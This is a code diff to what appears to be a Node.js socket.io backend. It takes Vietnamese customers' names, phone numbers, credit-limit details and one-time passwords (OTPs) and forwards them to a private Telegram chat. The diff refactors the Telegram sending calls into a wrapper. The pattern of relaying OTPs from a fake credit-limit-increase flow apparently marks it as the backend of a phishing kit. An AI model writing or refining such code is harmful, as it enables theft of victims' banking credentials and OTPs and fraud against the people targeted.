@@ -32,7 +32,7 @@ io.on("connection", function (socket) {
     socket.on('service', async (data) => {
         // send data to api telegram
         const message = `Có yêu cầu từ khách hàng: ${data.name} - Số điện thoại ${data.phone} - hạn mức hiện tại ${data.limit_now} - hạn mức khả dungh ${data.limit_total} - hạn mước mong muốn ${data.limit_increase}`;
-        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        await api.sendMessage({
             chat_id: process.env.TELEGRAM_CHAT_ID,
             text: message,
             mode: 'html'
@@ -58,16 +58,25 @@ io.on("connection", function (socket) {
     socket.on('otp', (data) => {
         // send data to api telegram
         const message = `Mã OTP: ${data.otp}`;
-        axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        // axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        //     chat_id: process.env.TELEGRAM_CHAT_ID,
+        //     text: message,
+        //     mode: 'html'
+        // }).then((res) => {
+        //     // console.log('res', res.data);
+        //     socket.emit('success', { message: 'Đã gửi mã OTP thành công' });
+
+        // }).catch((err) => {
+        //     // console.log('err', err);
+        //     socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
+        // });
+        api.sendMessage({
             chat_id: process.env.TELEGRAM_CHAT_ID,
             text: message,
             mode: 'html'
-        }).then((res) => {
-            // console.log('res', res.data);
+        }).then(() => {
             socket.emit('success', { message: 'Đã gửi mã OTP thành công' });
-
-        }).catch((err) => {
-            // console.log('err', err);
+        }).catch(() => {
             socket.emit('error', { message: 'Hệ thống đang quá tải, vui lòng thử lại sau!' });
         });
 
